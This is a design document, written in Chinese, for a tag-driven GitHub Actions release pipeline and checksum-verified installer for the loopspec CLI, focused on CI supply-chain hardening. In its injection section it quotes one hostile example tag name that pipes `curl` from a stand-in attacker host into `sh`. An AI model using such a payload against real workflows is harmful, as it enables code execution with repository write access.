> 第 4 轮。第 1 轮被 `security` 判 FAIL（4 项）；第 2 轮通过 `security` 但在 `approval` 被人要求改为 **tag 驱动**；第 3 轮按 tag 驱动重做后又被 `security` 判 FAIL（1 项：缺少"外部可影响值不得以 `${{ }}` 插值进入 `run:`"的约束）。
>
> 本轮改动：**D18**（表达式插值边界）为新增；**D15** 补上"它同时承担版本混淆防护"与"为何只能放在 `release` job"两段说明；**D2** 补上"glob 放行任意后缀"这一事实的后果；顺带吸收两条非阻塞建议（默认分支不硬编码、可达性校验位置的理由）。其余决策原样保留。
>
> **D3~D14、D16、D17 未受本轮判定影响，原样保留**——其中 D13（令牌可见性边界）、D14（构建后端约束）、D8（完整性校验三步断言）、D3 的资产白名单是第 1 轮 `security` FAIL 的修复成果；D5、D15、D16 三者联合构成版本混淆防护（见 D15），不得单独削弱。历史原文分别存于 `.attempts/round-001/`~`round-003/`。

## Context

仓库当前没有 `.github/`、没有 CI、没有任何分发产物。`make build`（`uv build`）产出的 wheel/sdist 只留在本地 `dist/`，README 的 "Install" 教的是 `make install`（`uv sync` 建开发虚拟环境）。用户想用这个 CLI，必须 clone + 装 uv + sync。

约束与既有事实：

- 包是**纯 Python**（`requires-python >= 3.11`，hatchling 构建，无扩展模块），产出的 `py3-none-any` wheel 天然跨平台——不需要按平台分发二进制。
- wheel 通过 `[tool.hatch.build.targets.wheel.force-include]` 把仓库根的 `schemas/` 打进 `loopspec/builtin_schemas`，所以**必须走正规构建**（`uv build` 已覆盖）。
- 版本号现在有**三处**，这是本设计的核心张力：
  1. **git tag 名**（如 `v0.1.0`）——按 `approval` 裁决，它是**发布版本号的权威来源**；
  2. `pyproject.toml` 的 `project.version`——它决定 **wheel/sdist 的文件名**，构建产物名绕不开它；
  3. `src/loopspec/__init__.py` 的 `__version__`——`loopspec version` 在源码 checkout 下的 fallback。

  三者不一致的后果是具体的：tag 打成 `v0.2.0` 而 `pyproject.toml` 还是 `0.1.0` 时，构建产出 `loopspec-0.1.0-py3-none-any.whl`，而 Release 叫 `v0.2.0`——用户下载到的文件名与版本号对不上。
- `[build-system] requires = ["hatchling"]` 目前**没有任何版本约束**，构建后端在每次构建时从 PyPI 重新解析。
- 仓库默认分支是 `main`（`origin/HEAD -> origin/main`）。裁决原话说的是"master 分支提交 tag"，本仓库没有 `master`，故按 `main` 处理。
- **git 的 tag 不属于任何分支**——"在 master 分支上打 tag"在 git 里没有直接对应概念，只能表达为"被打 tag 的 commit 可从默认分支到达"。见 D15。
- 已有 `Makefile` 作为统一任务入口（`install`/`dev`/`test`/`lint`/`build`/`clean`）。

**信任边界**（security gate 的重点，先在此点明）：

1. **CI 内执行的代码**：第三方 GitHub Action、`pyproject.toml` 声明的构建后端、仓库自己的测试代码。凭据是自动注入的 `GITHUB_TOKEN`。核心问题是**令牌能被哪些代码看见**（D13、D14）。
2. **tag 名是攻击者可影响的输入**。它有两条彼此独立、不可互相替代的风险路径：
   - **用途风险**——它会流入 Release 名、构建产物名断言与文件路径，需要格式闸门（D6）；
   - **执行风险**——若它以 `${{ }}` 表达式被插入 `run:` 脚本体，会在 shell 解析**之前**被展开为字面量，从而直接成为代码（D18）。**D18 的约束发生在 D6 的校验之前**，因为插值展开的那一刻载荷就已执行，事后再校验来不及。
3. **"谁能推 `v*` tag 就能发布"是 tag 驱动引入的授权假设**（见 Risks），其实际边界由 D5+D15+D16 联合收窄（见 D15）。
4. **用户机器上执行的脚本**：`curl ... | sh`，输入是 `LOOPSPEC_VERSION` 与 GitHub API 返回的 `tag_name`。

## Goals / Non-Goals

**Goals:**

- **发布是显式动作**：只有推送 `v<version>` 形式的 tag 才创建 Release；日常 commit 不会产生任何 Release。
- **持续校验不因此丢失**：默认分支的普通 push 仍然跑 lint + test + 构建校验（只是不发布）。
- 发布版本号取自 tag 名；三处版本号不一致时**明确失败**，不发出名不副实的产物。
- 用户能用一条命令完成安装，且**同一条命令**用于更新。
- 安装链路端到端可验证完整性：Release 里带 SHA256，脚本校验后才装；**校验不成立时必须失败**。
- CI 侧不新增任何 secret；权限按 job 最小化；令牌不暴露给任何执行仓库代码或第三方构建代码的步骤；**外部可影响的值不以表达式插值的形式进入脚本体**。
- 本地能预演 CI 的可本地验证部分（`make release-dry-run`），包括可选地预演"某个 tag 名是否与两处版本号一致"。

**Non-Goals:**

- 不发布到 PyPI（需要账号与 trusted publisher 配置，留作后续变更）。
- 不做平台专属二进制打包——纯 Python wheel 已够。
- 不提供 `install.ps1`；Windows 用户在 README 里被指引直接用 `uv tool install`。
- 不自动打 tag、不自动 bump 版本号、不维护手写 changelog（release notes 用 `--generate-notes`）。
- 不引入 Dependabot / renovate 跟进 action 版本。
- 不在 PR 上跑这套工作流。
- 不对安装时解析的**运行时依赖**做哈希固定（见 Risks）。
- **不引入 `hatch-vcs` 一类从 tag 派生版本号的方案**（见 D5 的替代方案讨论）。

## Decisions

### D1 — 一个 workflow 文件，两个 job：`verify`（只读）→ `release`（可写，仅在 tag 上运行）

`.github/workflows/release.yml` 顶层声明 `permissions: contents: read`。`verify` job 在**所有**触发下运行；`release` job 声明 `needs: verify`、单独提升为 `permissions: contents: write`，并用 ref 条件把自己限制在 tag 上：

```yaml
release:
  needs: verify
  if: startsWith(github.ref, 'refs/tags/v')
  permissions:
    contents: write
```

- **为什么不是单 job**：GitHub Actions 的 `permissions` 粒度是 job。单 job 意味着 lint/test 这些"执行仓库里任意代码"的步骤也带着 `contents: write` 跑。
- **为什么 `release` 用 ref 条件而不是拆成第二个 workflow 文件**：同一份 `verify` 定义要同时服务"分支 push 校验"与"tag 发布前校验"，拆文件就得复制一遍。ref 条件一行解决，且天然覆盖"在 tag 上手动 dispatch"（D17）。
- **`if:` 用在 job 级的 `startsWith(github.ref, ...)` 是条件判断，不是脚本插值**，不属于 D18 禁止的范围——D18 管的是 `run:` 脚本体。
- **`release` job 重新构建，而不是用 artifact 传递**（沿用前几轮结论，理由见 D14）。

### D2 — 触发与版本号来源：tag 驱动

```yaml
on:
  push:
    branches: [main]                        # 只跑 verify
    tags: ['v[0-9]+.[0-9]+.[0-9]+*']        # 跑 verify + release
  workflow_dispatch:
```

发布路径的版本号 SHALL 取自 tag 名：`GITHUB_REF_NAME` 去掉 `v` 前缀（tag push 时 `GITHUB_REF_NAME` 就是 tag 名），随后过 D6 的格式闸门，再交给 D5 做三方一致性校验。

- **为什么保留 `branches: [main]`**：裁决改的是**发布**的触发方式，不是"要不要持续校验"。若只留 `on.push.tags`，`main` 上的普通 commit 将完全没有 CI——那是相对第 2 轮方案的功能退化，而不是裁决要求的东西。
- **为什么 tag 模式写成 `v[0-9]+.[0-9]+.[0-9]+*` 而不是 `v*`**：`v*` 会把 `vendor-snapshot` 这类 tag 也拖进发布路径。
- **这个 glob 不是校验，而且它的尾部 `*` 放行任意后缀**：`v1.0.0-anything`、甚至 `v1.0.0$(...)` 这样的 tag 名都能匹配并触发工作流。这条事实有两个后果，必须同时应对：格式闸门（D6）负责"这个值能不能用于拼路径"，插值边界（D18）负责"这个值会不会在被检查之前就作为代码执行"。**把 glob 当成校验是本设计里最容易犯的错**，故在此写明。
- **为什么不再需要"读 `pyproject.toml` 决定要不要发"**：tag 的存在本身就是发布意图的表达。这同时消掉了"忘记 bump 版本号 → 以为发了其实没发"这一整类问题。
- **代价**：发布多了一个手工步骤（打 tag 并推送）。这是裁决明确选择的取舍——把发布从"改一行版本号的副作用"变成一个独立、可审计、可被 GitHub tag 保护规则管控的动作。

### D3 — 用 `gh release create`，版本号取自 tag，并按命名契约**显式列出**待发布文件

上传前先按契约拼出三个确定的文件路径，逐个断言存在，缺任何一个即失败。**不使用 `dist/*` 通配符**：

```yaml
- name: Publish release
  env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    # VERSION 由前序 step 经 $GITHUB_ENV 传入，已过 D6 闸门与 D5 三方校验
    wheel="dist/loopspec-${VERSION}-py3-none-any.whl"
    sdist="dist/loopspec-${VERSION}.tar.gz"
    for f in "$wheel" "$sdist" checksums.txt; do
      [ -f "$f" ] || { echo "missing asset: $f" >&2; exit 1; }
    done
    gh release create "$TAG" "$wheel" "$sdist" checksums.txt \
      --title "$TAG" --generate-notes
```

- **`TAG` / `VERSION` 都是环境变量引用，不是 `${{ }}` 插值**——见 D18。
- **与版本号驱动方案的差别**：tag 已经存在（是它触发了本次运行），所以 `gh release create` 不再需要 `--target` 去创建 tag。这少了一处"tag 指向哪个 commit"的歧义。
- **为什么不是 `dist/*`**（第 1 轮 security FAIL 的修复）：通配符把"发布哪些文件"的决定权交给构建目录的实际内容。spec 的资产契约是"上传**且仅上传**"三个文件，通配符表达不出这个"仅"；任何意外落入 `dist/` 的东西——包括被篡改的构建后端刻意多写的文件——都会被公开发布。
- **附带收益**：它是"tag 名与构建产物名一致"的最后一道断言。若 D5 因任何原因被绕过，这里也会因为文件不存在而失败——**失败方向是关闭**。
- **替代方案** `softprops/action-gh-release`：更声明式，但是第三方 action，为省几行 YAML 引入新的供应链依赖。

### D4 — 第三方 action 一律 pin 到 commit SHA

只用两个 action，都按 `<action>@<40位 SHA> # <tag>` 的形式写：

- `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1` # v7.0.1
- `astral-sh/setup-uv@c771a70e6277c0a99b617c7a806ffedaca235ff9` # v9.0.0

（两个 SHA 已通过 `gh api repos/<repo>/git/ref/tags/<tag>` 核对为对应 tag 指向的 commit。）

- **为什么 pin SHA 而不是 `@v7`**：可变 tag 可以被重新指向，SHA 不能。CI 里执行的第三方代码是最直接的供应链入口。
- **代价**：SHA 不会自动跟进上游修复。缓解：行尾注释保留人类可读的 tag，本文件记录更新方式（重跑 `gh api repos/<repo>/git/ref/tags/<tag>` 取新 SHA）。
- `setup-uv` 选自 Astral 官方（uv 的作者），而非社区 action；开启其内建 cache 以缩短 `uv sync` 时间。

### D5 — `scripts/check_version.py` 是三方一致性校验器

脚本只用标准库（`tomllib` 读 `pyproject.toml`、`ast` 解析 `__init__.py`，不 import 该包），支持两种调用：

- **无参调用**：校验两处一致且格式合法，把版本号打到 stdout，以 0 退出。用于 `verify` job（两种触发下都跑）与 `make release-dry-run`。
- **`--expect <version>` 调用**：追加断言两处都等于 `<version>`（即 tag 名去掉 `v` 后的值）。任一不等即把三处实际值打到 stderr 并非零退出。用于 `release` job，**且必须在构建之前执行**。

- **为什么"版本号读 tag"并不能免掉这个校验**：wheel/sdist 的文件名由 `pyproject.toml` 的 `version` 决定，不是由 tag 决定。tag `v0.2.0` 配 `pyproject.toml` 里的 `0.1.0`，构建出来就是 `loopspec-0.1.0-py3-none-any.whl`——要么发布失败（被 D3 的存在性断言拦下），要么发出一个文件名与 Release 版本号矛盾的资产。拦在构建之前，诊断信息比事后"资产文件不存在"清楚得多。
- **它还承担版本混淆防护**：见 D15。
- **单一入口仍然成立**：`verify` job、`release` job、`make release-dry-run` 共用这一个脚本，只是传参不同，避免"CI 用 grep、Makefile 用 sed"的多份实现漂移。
- **替代方案：`hatch-vcs` 一类从 git tag 派生版本号的方案** —— 被否。它能真正做到"版本号只有 tag 一个来源"，代价是：① 新增构建期依赖（与 D14 想收缩的构建后端信任面方向相反）；② 改变 `loopspec version` 在源码 checkout 下的 fallback 语义（现在有意保留 `__version__`，改为 vcs 派生后没有 tag 的 checkout 会得到 `0.1.dev…+g<sha>` 一类值）；③ sdist 与 git 元数据的耦合让"从 sdist 再构建"多一个坑。留作后续变更；本轮用"tag 权威 + CI 强制三方一致"取得等价的正确性保证。

### D6 — 版本号与 tag 名的格式闸门（用途校验）

同一条正则贯穿全链路：

```
^[0-9]+\.[0-9]+\.[0-9]+([._-]?(a|b|rc|alpha|beta|dev|post)[0-9]+)?$
```

校验对象：**tag 名**去掉 `v` 前缀后的值（在被拼进 Release 名、文件路径或任何命令参数**之前**）、`pyproject.toml` 的 `project.version`、客户端的 `LOOPSPEC_VERSION`、以及 `install.sh` 从 GitHub API 响应里提取出的 `tag_name`。

- **这是"用途闸门"，不是注入防线**：它保证"这个值可以安全地拼进路径与参数"，管不了"这个值在被检查之前是否已经作为代码执行"——后者是 D18 的职责。两者阶段不同，不可互相替代。
- **为什么 tag 名必须校验**：`on.push.tags` 的 glob 收窄了一部分，但 glob 表达不了"三段数字"，尾部 `*` 放行任意后缀。校验后它只可能是 `[0-9a-z._-]` 的子集。
- **为什么 API 返回值也要校验**：同理——未校验就拼接，等于把 `../` 或 shell 元字符的处置权交给上游响应。

### D7 — `install.sh` 的产物定位：先解析 `tag_name`，再拼固定命名的 URL

1. 若 `LOOPSPEC_VERSION` 已给 → 校验格式，直接用，**不调 API**。
2. 否则 `GET https://api.github.com/repos/mingyuans/LoopSpec/releases/latest`，从响应里抽 `"tag_name": "vX.Y.Z"`，剥掉 `v` 前缀 → 校验格式。
3. 用版本号拼出两个确定的 URL：
   - `.../releases/download/v$V/loopspec-$V-py3-none-any.whl`
   - `.../releases/download/v$V/checksums.txt`

- **为什么不依赖 `jq`**：`jq` 不是 macOS/精简容器的默认组件。只抽一个形如 `"tag_name": "v0.1.0"` 的字段，用 `sed` 足够，且抽出的结果立刻过 D6 的闸门——**解析宽松、校验严格**。抽取失败得到空串同样会被拒。
- **为什么不用 `/releases/latest/download/<file>` 重定向**：那个路径要求文件名已知，而文件名含版本号，绕不开先拿版本号这一步。
- **为什么只装 wheel 不装 sdist**：wheel 是 `py3-none-any`，无需在用户机器上跑构建后端。sdist 仍然发布，供需要从源码构建的场景使用。
- 资产文件名由 hatchling 的标准命名规则决定（`loopspec-<version>-py3-none-any.whl` / `loopspec-<version>.tar.gz`），这构成 CI 与脚本之间的**命名契约**，D3 与 D7 都是它的消费者。

### D8 — 完整性校验：条目必须存在，校验必须实际发生

wheel 与 `checksums.txt` 都下到 `mktemp -d` 的目录。校验分成三个**都必须成功**的步骤，任一失败即非零退出：

1. **定位条目**：从 `checksums.txt` 中过滤出文件名字段**恰好等于**目标 wheel 基名的行，写入一个单行文件。
2. **断言恰好一条**：该过滤结果的行数必须**等于 1**。为 0（条目缺失、下载到的是错误页面、文件为空）或大于 1（重复/歧义条目）都必须失败。
3. **执行校验**：把这个单行文件交给 `sha256sum -c` 或 `shasum -a 256 -c`（按 `command -v` 探测），并以临时目录为工作目录执行（记录中是基名），依其退出码判定。

- **为什么把"恰好一条"提升为独立断言**（第 1 轮 security FAIL 的修复）：只说"用 `sha256sum -c checksums.txt` 校验"会逼出两条不安全的实现——`--ignore-missing`（macOS 的 `shasum` 是 Perl 脚本，不支持该选项；且"零个文件被校验"时各实现行为不一致），或 `grep` 抠行后比对（匹配不到时得到空串，不显式判空就成了"空 vs 空"的假通过）。**"没校验到"必须等于"校验失败"。**
- **精确匹配而非子串匹配**：比对的是行内文件名字段与目标 wheel 基名**相等**——否则 `0.1.0` 会同时命中 `0.1.0` 与 `0.1.0.post1`。
- **为什么不让 `uv tool install <URL>` 直接从远端装**：那样校验的字节和安装的字节不是同一次下载，校验成了摆设。
- **两种校验工具都不存在时：中止，退出码非零。** 不提供跳过校验的降级路径或开关。这是本变更里最不该被"便利性"侵蚀的一条。
- **诚实的边界**：`checksums.txt` 与 wheel 来自同一个 Release、同一条 TLS 通道，由同一个 job 现算现发。它保证的是"两个文件是同一次发布的、传输中没有一方被单独替换"，**不是**"发布者可信"，也不能对抗"能改写整个 Release 的攻击者"。承载来源可信的是 GitHub 的权限模型与 TLS。

### D9 — 安装后端：`uv tool install --force` 优先，回退 `pipx install --force`，都没有则失败

- `--force` 让"安装"和"更新"是同一条路径：已装则覆盖到目标版本，未装则新装。脚本因此天然幂等。
- **不回退到 `pip install --user`**：会污染用户的 default Python 环境，与 CLI 工具应有的隔离语义相悖。
- **绝不使用 `sudo`**、绝不写系统目录。
- 两者都缺 → 打印 uv 的官方安装命令并以非零码退出。**不**自动去装 uv：那是在用户没同意的情况下扩大安装范围。

### D10 — `install.sh` 的执行安全形态

- `#!/bin/sh` + `set -eu`（不写 `pipefail`——POSIX sh 没有；管道处用显式返回值判断）。dash/bash/zsh 都能跑。
- 全部逻辑包在 `main() { ... }` 里，文件末尾才 `main "$@"`。`curl | sh` 遇到连接中断、只收到半个脚本时，`main` 不会被调用。
- `trap 'rm -rf "$tmp"' EXIT INT TERM` 清理临时目录；临时目录由 `mktemp -d` 创建，不用可预测路径。
- 所有下载：`curl -fsSL --proto '=https' --tlsv1.2`——强制只走 https，杜绝被重定向到 http。
- **无 `eval`、无嵌套的 `curl | sh`、不下载并执行除目标 wheel 之外的任何东西。**
- 静态检查：`shellcheck` + `sh -n` 在 CI 中**都是硬要求**；本地 `make release-dry-run` 在 `shellcheck` 缺失时跳过它并提示。

### D11 — PATH 未就绪时警告但不失败

安装成功后执行 `loopspec version` 自检。若 `command -v loopspec` 找不到，打印 `~/.local/bin` 加入 PATH 的提示（uv 场景另提 `uv tool update-shell`），**退出码仍为 0**——包确实装好了，问题在当前 shell 的 PATH。

### D12 — README 结构：用户视角的 Install、发布者视角的 Releases、贡献者视角的 Development

- **Install**：一行式脚本（含"先下载再审阅"的两步替代命令）、`uv tool install` / `pipx` 手动路径、更新（同一条命令）、卸载、Windows 说明。
- **Releases**：发布流程改为显式三步，必须按序：
  1. 把 `pyproject.toml` 与 `src/loopspec/__init__.py` 的版本号同时改成目标版本，合并到 `main`；
  2. `git tag v<version> <main 上的 commit>`；
  3. `git push origin v<version>`。

  并说明：只有第 3 步会触发发布；tag 名与两处版本号不一致会失败；Release 资产清单；**仓库设置前置条件**（`Settings → Actions → General → Workflow permissions` 需允许 `Read and write`，否则 `gh release create` 会 403）；以及"谁能推 `v*` tag 就能发布，建议用 GitHub 的 tag 保护规则（ruleset）收紧"这条提示。
- **Development**：保留 `make install` / `test` / `lint` / `build` / `clean`，新增 `release-dry-run`（含 `TAG=v0.1.0` 的用法）。

### D13 — 令牌可见性边界：checkout 不持久化凭据，令牌只绑定在调用 `gh` 的 step 上

（第 1 轮 security FAIL 的修复，原样保留。）三条规则缺一不可：

1. **两个 job 的 `actions/checkout` 都显式 `with: persist-credentials: false`。** 默认行为会把 `GITHUB_TOKEN` 以 `http.extraheader` 写进 `.git/config`——那是工作目录里的普通文件，同 job 内任何代码都能读。
2. **令牌只以 step 级 `env: GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}` 注入调用 `gh` 的 step**，不得出现在 workflow 级或 job 级 `env`。
3. **任何执行仓库代码或第三方代码的 step 都不得注入令牌**：`pytest`、`ruff`、`mypy`、`uv sync`、`uv build`、`shellcheck` 全部在无令牌的环境下运行。

- **与 D3、D15 的互补**：发布走 `gh` 而非 `git push`，可达性校验走 `gh api` 而非 `git fetch`，所以整条流程本就不需要 git 的推送/拉取凭据——`persist-credentials: false` 不损失任何功能。
- **`env` 里的 `${{ secrets.GITHUB_TOKEN }}` 不违反 D18**：D18 禁止的是把**外部可影响的值**插进 `run:` 脚本体；secrets 经 `env:` 绑定正是 D18 要求的形态本身。
- **可验证性**：三条都能靠读 workflow 文件断言，因此可以写成 spec 需求。

### D14 — 构建后端的版本约束，以及在特权 job 内构建的隔离条件

（第 1 轮 security FAIL 的修复，原样保留。结论：`release` job 继续自己构建，但补三层控制。）

1. **给构建后端加版本约束**：`[build-system] requires` 从裸 `"hatchling"` 改为 `"hatchling>=1.31,<2"`（1.31.0 是当前 PyPI 上的版本，也是本变更验证构建所用版本；上界排除下一个大版本）。
2. **构建 step 不得看到令牌**（D13 第 3 条）：`uv build` 会执行构建后端的钩子代码；该 step 环境中无令牌，工作目录 `.git/config` 中也无凭据。
3. **构建产物不被通配符发布**（D3）：被投毒的后端即使往 `dist/` 多写文件，也不会被发布。

- **为什么不改成从 `verify` 传产物**：那只是把同一段构建后端代码搬到另一个 job 执行，"执行第三方构建代码"这件事没有消失，却要多引入两个 action 依赖。
- **诚实的残余风险**：版本范围**不是**哈希固定——`pyproject.toml` 无法表达哈希，`uv build` 仍会在范围内解析到最新补丁版。这缩小了窗口，但没有消除"构建时解析第三方代码"。显式接受。

### D15 — 被打 tag 的 commit 必须可从默认分支到达

裁决原话是"master 分支提交 tag"，而 git 的 tag 不属于任何分支。落实这个意图的唯一准确表述是：**被打 tag 的 commit 必须可从默认分支到达**。`release` job 在发布之前 SHALL 做这项校验，不满足即失败。实现走 `gh api` 的提交比较，仅 `identical`（tag 指向默认分支当前 HEAD）与 `behind`（tag 指向默认分支历史上的较早 commit，补发旧版本的正常情形）放行，`ahead`/`diverged` 拒绝。

- **默认分支名不硬编码**：先用 `gh api "repos/$GITHUB_REPOSITORY" --jq .default_branch` 取得，再做比较。硬编码 `main` 在默认分支被改名后会失败在一个看起来无关的地方（方向仍是关闭的，但诊断很差）。
- **为什么用 `gh api` 而不是 `git merge-base --is-ancestor`**：后者需要本地有默认分支的历史，意味着 `fetch-depth: 0` 外加一次 `git fetch`；而在 `persist-credentials: false` 之下，额外的 `git fetch` 在私有仓库场景会缺凭据。`gh api` 这一步本来就允许持有令牌（D13 第 2 条），也不需要加深 checkout 深度。
- **为什么这项校验只能放在 `release` job，而不是前移到 `verify` 的第一步**：它需要调 GitHub API，而 `verify` 按 D13 第 3 条**不持有令牌**。把它前移就得给 `verify` 注入令牌，那会破坏 D13——用一个更重要的约束去换一个次要的时序优化，不值得。**后果如实记录**：给一个未合入默认分支的 commit 打 tag，仍会让该 commit 的代码在 `verify` 里执行一次（`pytest`、`uv build`）。影响有界：`verify` 无令牌、`contents: read`，且 Actions 的 cache 作用域不允许非默认 ref 的缓存回写到默认分支。接受。
- **它同时承担版本混淆防护（本轮补记）**：这不是 D15 单独的目标，而是三条决策的联合效果——**D15 + D5 的 `--expect` + D16**。把一个旧 commit 打成 `v9.9.9` 发成"最新版"这条路被同时堵在三处：D15 要求 tag 指向的 commit 可从默认分支到达；D5 要求该 commit 的 `pyproject.toml` 与 `__init__.py` **都等于 tag 版本号**（旧 commit 声明的是它当时的版本，对不上就失败）；D16 要求同名 Release 不得已存在。三者叠加后，能推 tag 者实际只能发布"默认分支历史上某个自己声明了该版本号、且尚未发布过的 commit"，无法凭空造一个高版本号。**若要否掉 D15，需知道这会同时削弱这层防护**（剩下 D5+D16 仍能挡住大部分，但"未合入默认分支的 commit"就不再受限）。
- **代价与可否决性**：多一次 API 调用；且若将来出现"从维护分支发补丁版"的需求，这条会挡路（届时需扩展为"可从默认分支或任一 `release/*` 分支到达"）。**这条是我对"在 master 分支打 tag"这句话的落实方式，不是裁决明确要求的**——若认为多余，删掉这一个 step 即可，但请先读上一条。

### D16 — Release 已存在时失败，而不是跳过

若该 tag 的 Release 已存在，`release` job SHALL **失败**并给出可操作的提示，SHALL NOT 静默跳过。

- **为什么"跳过且算成功"的旧语义必须撤掉**：它存在的唯一理由是"默认分支每个 commit 都走发布路径，不能每次亮红叉"。tag 驱动之下，一次 tag 推送就是一次明确的发布意图——此时"我做不到"却报成功，是在掩盖失败。
- **什么情况会撞上**：重跑一个已成功的工作流；或删掉 tag 后重推同名 tag。前者应当报错（这次运行确实没能创建 Release）；后者是发布流程本身出了问题，更该响亮地失败。
- **提示要可操作**：失败信息应给出两条出路——`gh release delete v<x> --cleanup-tag` 后重推 tag，或改用新版本号。
- **仍然必须区分"明确不存在"与"查询本身失败"**：只有明确的"不存在"才继续发布；网络错误、5xx、权限问题一律失败，不得被当作"不存在"而误入发布路径。

### D17 — `workflow_dispatch` 的语义：只有在 tag ref 上才发布

保留 `workflow_dispatch`，语义由 D1 的 ref 条件自然确定，无需额外逻辑：

- **在 tag ref 上手动触发** → `verify` + `release` 都跑，等价于重新走一遍该 tag 的发布（受 D16 约束，若 Release 已存在则失败）。这是补发/重试的入口。
- **在分支 ref 上手动触发** → 只跑 `verify`，`release` job 被 `if` 条件跳过。

- **为什么不让分支上的手动触发也能发布**：那就得凭空猜一个版本号（读 `pyproject.toml`），等于把刚被裁决撤掉的旧机制从后门放回来。**没有 tag 就没有发布版本号**，不留例外。
- GitHub 的 "Run workflow" 下拉框同时列出分支与 tag，因此"在 tag 上手动触发"是现成可用的操作，不需要额外加 `inputs`。

### D18 — 表达式插值边界：外部可影响的值只经 `env:` 进入 `run:`（第 4 轮新增）

这是对第 3 轮 `security` FAIL 的回应。规则有三条：

1. **workflow 的 `run:` 脚本体内 SHALL NOT 出现 `${{ github.* }}` / `${{ env.* }}` / `${{ inputs.* }}` 一类表达式插值。** 需要用到的值一律通过该 step 的 `env:` 绑定，在脚本里以带引号的变量展开引用（`"$TAG"`、`"${GITHUB_REF_NAME#v}"`）。
2. **step 之间传值走 `$GITHUB_ENV` / `$GITHUB_OUTPUT`**，读取端同样以环境变量引用，而不是把上游 step 的 `outputs` 插值进脚本体。
3. **`if:` 条件、`env:` 的值、`uses:` 的参数等非脚本体位置允许使用表达式**——它们不会被拼进 shell 脚本，不构成注入面。

- **为什么这条必须独立于 D6 存在**：`${{ }}` 由 Actions 在**生成脚本文件之前**展开成字面量，因此 `v1.0.0$(curl -s http://attacker/x | sh)` 这样的 tag 名一旦被插值进 `run:`，载荷在 shell 解析时就会执行——**这发生在 D6 的正则校验之前**，事后校验来不及。而 `on.push.tags` 的 glob 尾部 `*` 恰好放行任意后缀（D2），这类 tag 名是能真实触达工作流的。D6 管"能不能用于拼路径"，D18 管"会不会在被检查之前就作为代码执行"，两者阶段不同、不可互相替代。
- **在 `release` job 里这条尤其要紧**：那是全工作流唯一持有 `contents: write` 的上下文，一次注入意味着可改写仓库与发布产物。
- **为什么写成"禁止插值"而不是"对插值做转义"**：转义要逐处判断上下文（shell 引号层级、嵌套命令替换），容易漏；`env:` 绑定是结构性的一次性正确。
- **可验证性**：可以靠读 workflow 文件断言——`run:` 块内不出现 `${{ github.`。这使它能写成 spec 需求并被一条验证任务覆盖，而不是只靠人自觉。

## Risks / Trade-offs

- **[谁能推 `v*` tag 就能发布 —— tag 驱动引入的授权假设]** → 旧方案下发布需要把版本号变更合入默认分支（走 PR 与分支保护）；tag 驱动下只要有仓库写权限就能推 tag 并触发发布。实际边界由 D5+D15+D16 联合收窄到"默认分支历史上某个自己声明了该版本号、且尚未发布过的 commit"（见 D15）。缓解：README 提示用 GitHub 的 tag 保护规则（ruleset）限制 `v*` 的推送者。**这是配置层面的建议，不由本变更的代码强制**——如实写明，不假装已解决。
- **[给未合入默认分支的 commit 打 tag 仍会让其代码在 `verify` 中执行一次]** → 见 D15：可达性校验只能放在持有令牌的 `release` job。影响有界（无令牌、只读权限、cache 作用域不向默认分支回写），接受。
- **[三处版本号需要人手同步]** → CI 强制 tag 名 = `pyproject.toml` = `__init__.py`，不一致即失败（D5），且失败发生在构建之前、报错含三处实际值。代价是发布前要改两个文件；`hatch-vcs` 能消掉这个负担但代价更大（D5）。
- **[打了 tag 但忘记先改版本号 → 发布失败]** → fail-closed 的正确方向，但会浪费一次 tag。缓解：`make release-dry-run TAG=v0.2.0` 可在本地预演三方校验；README 把"先改版本号并合入默认分支"列为第 1 步。
- **[`on.push.tags` 的 glob 不是校验]** → 已在 D2/D6/D18 显式点明；真正的把关是 D6 的正则闸门（用途）与 D18 的插值边界（执行）。
- **[`curl | sh` 的固有信任问题]** → 无法根除，只能缩小：README 同时给出"下载 → 审阅 → 执行"的两步命令和完全手动的 `uv tool install` 路径；脚本不提权、不写系统目录、只装经 SHA256 校验的 wheel。
- **[构建时解析第三方构建后端（残余）]** → 见 D14：版本上下界缩小窗口，令牌对构建 step 不可见，发布走文件名白名单。不做哈希固定，显式接受。
- **[安装时解析的运行时依赖未做哈希固定]** → `uv tool install <wheel>` 会从 PyPI 解析 `pydantic`/`typer`/`rich`/`pyyaml`/`questionary`。本变更只保证"你装到的 loopspec wheel 是我们发的那个"，不保证其依赖树。spec 里不做超出实现的承诺。
- **[pin 到 SHA 的 action 不会自动更新]** → 行尾注释保留 tag，本文件记录用 `gh api repos/<repo>/git/ref/tags/<tag>` 取新 SHA 的方法。
- **[`verify` 与 `release` 各构建一次]** → hatchling 对同一 commit 的输出确定；`checksums.txt` 由 `release` job 对**自己**产出的文件计算，发布的资产与其校验值必然自洽。残余风险仅是"verify 通过而 release 构建失败"，那会红在 CI 里。
- **[GitHub API 未认证时 60 次/小时/IP 的速率限制]**（仅影响 `install.sh`）→ 只在未指定 `LOOPSPEC_VERSION` 时调一次；被限流时报错并提示可用 `LOOPSPEC_VERSION=x.y.z` 跳过。
- **[`--generate-notes` 的质量取决于 commit 信息]** → 接受，本变更不引入 changelog 流程。

## Migration Plan

1. 新增 `.github/workflows/release.yml`、`install.sh`、`scripts/check_version.py`、`tests/test_check_version.py`；改 `pyproject.toml`（`[build-system] requires` 加版本约束）、`Makefile`、`README.md`。
2. 本地 `make lint`、`make test`、`make release-dry-run` 全绿；再跑 `make release-dry-run TAG=v0.1.0` 确认三方校验通过，以及 `TAG=v9.9.9` 确认它会失败。
3. 合并到 `main`：此时**不会发布任何东西**——只跑 `verify`。
4. 想发首个版本时显式执行：确认 `pyproject.toml` 与 `__init__.py` 都是 `0.1.0` → `git tag v0.1.0 <main 的 commit>` → `git push origin v0.1.0`。观察工作流创建 Release 并上传三个资产。
5. 用 `curl -fsSL <raw install.sh URL> | sh` 在干净环境实测一次安装，再重跑一次验证更新路径幂等；另故意改坏本地 `checksums.txt` 验证校验会失败（确认 D8 的断言真的生效）。
6. **回滚**：删除 `.github/workflows/release.yml` 即停止一切自动发布；已发出的 Release/tag 用 `gh release delete v<x> --cleanup-tag` 撤除。`install.sh` 留在仓库里不产生任何自动行为。`[build-system]` 的版本约束可单独还原。

